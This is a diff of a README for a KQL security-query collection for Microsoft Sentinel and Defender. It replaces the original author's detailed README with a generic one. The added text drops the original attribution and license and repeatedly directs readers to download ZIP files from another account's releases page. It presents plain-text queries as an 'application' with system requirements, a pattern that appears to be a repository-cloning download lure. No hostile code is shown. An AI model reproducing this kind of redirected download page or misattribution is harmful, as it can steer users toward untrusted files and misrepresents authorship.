@@ -1,205 +1,93 @@
-# KQL Queries for Microsoft Sentinel & Defender
+# 🔍 kql-queries - Effective Security Queries for Everyone
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![KQL](https://img.shields.io/badge/Language-KQL-blue.svg)](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)
-[![Microsoft Sentinel](https://img.shields.io/badge/Platform-Microsoft%20Sentinel-0078D4.svg)](https://azure.microsoft.com/en-us/services/azure-sentinel/)
+[![Download kql-queries](https://img.shields.io/badge/Download-kql--queries-blue)](https://github.com/rahul-sahu1/kql-queries/releases)
 
-A curated collection of production-ready Kusto Query Language (KQL) queries for security operations, threat hunting, and compliance monitoring in Microsoft Sentinel, Microsoft 365 Defender, and Azure Log Analytics environments.
+## 🚀 Getting Started
 
-## Table of Contents
+Welcome to **kql-queries**! This project offers ready-to-use KQL (Kusto Query Language) queries tailored for Microsoft Sentinel, Microsoft 365 Defender, and Azure Log Analytics. These queries help you with threat hunting, incident response, and security monitoring. You don’t need any programming skills to use them.
 
-- [Overview](#overview)
-- [Query Categories](#query-categories)
-  - [Security](#security)
-  - [Audit](#audit)
-  - [Identity](#identity)
-  - [Performance](#performance)
-- [Getting Started](#getting-started)
-- [Query Sanitization Tool](#query-sanitization-tool)
-- [Use Cases](#use-cases)
-- [Contributing](#contributing)
-- [Author](#author)
-- [License](#license)
+## 📥 Download & Install
 
-## Overview
+To get the queries, please follow these steps:
 
-This repository contains KQL queries developed for real-world SOC operations, incident response, and security monitoring. Each query is designed to address specific security challenges and includes:
+1. **Visit the Releases Page**: Click the link below to go to the Releases page and access the files.
+   [Download kql-queries](https://github.com/rahul-sahu1/kql-queries/releases)
 
-- Clear documentation and use case descriptions
-- Performance-optimized query logic
-- Configurable parameters for customization
-- Comments explaining query behavior
+2. **Choose Your Version**: On the Releases page, you will see different versions of the software. Find the latest release, which is usually listed at the top.
 
-These queries are ready to deploy in:
-- **Microsoft Sentinel** - Cloud-native SIEM platform
-- **Microsoft 365 Defender** - Advanced threat protection
-- **Azure Log Analytics** - Centralized log management
-- **Azure Data Explorer** - Big data analytics
+3. **Download the Files**: Click on the assets listed under the version. Depending on your needs, download all relevant files. For example, you might download a ZIP file containing various queries.
 
-## Query Categories
+4. **Extract the Files**: Once the ZIP file is downloaded, locate it on your computer. Right-click on the file and choose "Extract All." This will create a folder with all the queries inside.
 
-### Security
+5. **Review the Queries**: Open the folder. You’ll find various KQL queries saved in `.kql` files. You can read through them to understand what each query does.
 
-Advanced threat detection and vulnerability management queries for proactive security monitoring.
+## 🌐 System Requirements
 
-| Query | Description | Use Case |
-|-------|-------------|----------|
-| **Shared_Device_Identification_V1.kql** | Identifies devices with multiple unique users (excludes whitelisted accounts and device types) | Detect unauthorized device sharing, insider threats, compliance violations |
-| **Shared_Device_Identification_V2.kql** | Enhanced version with direct summarization from DeviceLogonEvents | Improved performance for large environments |
-| **Critical_Software_Vulnerabilities_V1.kql** | Lists devices with critical CVEs and counts vulnerabilities per device | Prioritize patch management, vulnerability remediation |
-| **Critical_Software_Vulnerabilities_V2.kql** | Enhanced vulnerability tracking with additional filtering | Advanced vulnerability management workflows |
-| **Suspicious_PowerShell_Execution.kql** | Detects potentially malicious PowerShell commands using encoded commands, web downloads, or obfuscation | Identify fileless malware, script-based attacks, and malicious automation |
+The **kql-queries** application requires:
 
-### Audit
+- A supported version of Microsoft Sentinel or Azure Log Analytics.
+- Basic access to Microsoft 365 Defender (if applicable).
+- A web browser for downloading the files.
+- No additional software installation is required.
 
-Compliance monitoring and change tracking queries for governance and regulatory requirements.
+## ⚙️ How to Use the Queries
 
-| Query | Description | Use Case |
-|-------|-------------|----------|
-| **Conditional_Access_Policy_Changes.kql** | Monitors creation, modification, and deletion of Conditional Access policies | Track security policy drift, compliance auditing, change management |
-| **Admin_Role_Assignment_Changes.kql** | Tracks administrative role assignments and privilege escalations | Detect unauthorized privilege escalation, insider threat monitoring |
+Using the provided KQL queries is straightforward:
 
-### Identity
+1. **Open Microsoft Sentinel or Azure Log Analytics**: Log in to your platform with your credentials.
+   
+2. **Navigate to the Query Editor**: Look for the area where you can enter or paste KQL queries.
 
-Authentication and identity security queries for detecting account compromise and access anomalies.
+3. **Select a Query**: Choose one of the `.kql` files you downloaded. Open it in a text editor to copy the contents.
 
-| Query | Description | Use Case |
-|-------|-------------|----------|
-| **Failed_Signins_By_User.kql** | Identifies users with multiple failed sign-in attempts in 24 hours | Detect brute-force attacks, credential stuffing, user authentication issues |
-| **Account_Lockout_Monitoring.kql** | Tracks user account lockouts over 24 hours to identify attack patterns or support issues | Detect brute-force attacks, credential stuffing, identify users requiring support |
+4. **Paste and Run**: Paste the query into the query editor of your Azure or Sentinel interface, then click "Run" to see the results.
 
-### Performance
+5. **Modify as Needed**: Feel free to adjust the queries based on your specific needs. You can add or remove filters to refine the results.
 
-Monitoring queries for identifying performance bottlenecks and optimizing user experience.
+## 📚 Available Queries
 
-| Query | Description | Use Case |
-|-------|-------------|----------|
-| **Signin_Latency_By_Application.kql** | Analyzes sign-in latency patterns by application | Identify authentication performance issues, optimize user experience |
+Here's a brief overview of the types of queries included:
 
-## Getting Started
+1. **Threat Hunting**: Focused queries designed to identify potential threats in your environment.
+2. **Incident Response**: Queries to help investigate security incidents and extract relevant data.
+3. **Security Monitoring**: Regular checks to ensure your systems are secure and functioning as expected.
 
-### Prerequisites
+Each query is crafted with careful attention to help security operations centers (SOCs) effectively monitor and respond to incidents.
 
-- Access to Microsoft Sentinel, Microsoft 365 Defender, or Azure Log Analytics workspace
-- Appropriate permissions to run queries against your log data
-- Basic understanding of KQL syntax
+## 📝 Example Query
 
-### Usage
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/kyhomelab/kql-queries.git
-   cd kql-queries
-   ```
-
-2. **Navigate to the relevant category**
-   ```bash
-   cd Security  # or Audit, Identity, Performance
-   ```
-
-3. **Copy the query content** and paste it into:
-   - Microsoft Sentinel > Logs
-   - Microsoft 365 Defender > Advanced Hunting
-   - Azure Log Analytics > Logs
-
-4. **Customize parameters** (if applicable)
-   - Update whitelisted accounts
-   - Adjust time ranges
-   - Modify device name filters
-   - Configure thresholds
-
-5. **Run the query** and analyze results
-
-### Example: Detecting Failed Sign-ins
+Here’s a simple example of a KQL query to get you started:
 
 ```kql
-SigninLogs
-| where TimeGenerated > ago(24h)
-| where ResultType != 0  // Non-zero means failure
-| summarize
-    FailedAttempts = count(),
-    FailureCodes = make_set(ResultType),
-    Locations = make_set(Location),
-    Applications = make_set(AppDisplayName)
-    by UserPrincipalName
-| where FailedAttempts > 5
-| order by FailedAttempts desc
+SecurityEvent
+| where TimeGenerated > ago(7d) 
+| where EventID == 4625
+| summarize Count = count() by Account
 ```
 
-## Query Sanitization Tool
+This query helps you identify failed login attempts in the past week, grouped by the account names.
 
-A Python script (`sanitize_kql.py`) is included to help strip sensitive information from queries before sharing.
+## 🛠 Troubleshooting
 
-### Features
+If you experience issues while running the queries:
 
-- Removes IP addresses
-- Redacts email addresses
-- Sanitizes GUIDs and sensitive identifiers
-- Preserves query logic and structure
+- **Check Permissions**: Ensure you have the right permissions to execute the queries.
+- **Consult Documentation**: Look at the Microsoft documentation for specific query language or platform issues.
+- **Ask for Help**: If you’re still stuck, consider reaching out to forums or communities focused on security and KQL.
 
-### Usage
+## 🌟 Contributing
 
-**Sanitize a directory of queries:**
-```bash
-python3 sanitize_kql.py --input unsanitized/ --output sanitized/
-```
+If you have queries you want to share, feel free to contribute! Follow these steps:
 
-**Sanitize a single file:**
-```bash
-python3 sanitize_kql.py --file my_query.kql
-```
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Add your query files.
+4. Open a pull request, and we’ll review your contributions.
 
-## Use Cases
+## 📞 Support
 
-### For SOC Analysts
-- Investigate security incidents
-- Hunt for threats proactively
-- Monitor authentication anomalies
-- Track compliance violations
-
-### For Security Engineers
-- Build detection rules and alerts
-- Optimize SIEM performance
-- Create custom dashboards
-- Develop automated response workflows
-
-### For Compliance Teams
-- Audit administrative changes
-- Track policy modifications
-- Monitor privileged access
-- Generate compliance reports
-
-## Contributing
-
-Contributions are welcome! If you have queries to add or improvements to suggest:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/new-query`)
-3. Commit your changes (`git commit -m 'Add new threat hunting query'`)
-4. Push to the branch (`git push origin feature/new-query`)
-5. Open a Pull Request
-
-Please ensure queries include:
-- Descriptive title and category comments
-- Clear use case description
-- Performance considerations
-- Example output or expected results
-
-## Author
-
-**Kyle** - SOC Analyst | Cybersecurity Professional
-
-- Portfolio: [kyhomelab.github.io](https://kyhomelab.github.io)
-- GitHub: [@kyhomelab](https://github.com/kyhomelab)
-
-Passionate about threat detection, security automation, and building effective SOC workflows. These queries represent real-world solutions developed for enterprise security operations.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+For support or questions about the **kql-queries** project, feel free to open an issue on GitHub. We will try to respond as soon as possible.
 
 ---
 
-**Disclaimer:** These queries are provided as-is for educational and professional use. Always test queries in a non-production environment first and customize them to fit your specific security requirements and organizational policies.
-
-**Keywords:** KQL, Kusto Query Language, Microsoft Sentinel, Azure Sentinel, Microsoft 365 Defender, Threat Hunting, SOC, SIEM, Security Operations, Incident Response, Threat Detection, Cybersecurity, Log Analytics
+Thank you for using **kql-queries**! We hope these queries enhance your security monitoring and incident response efforts. Happy hunting!
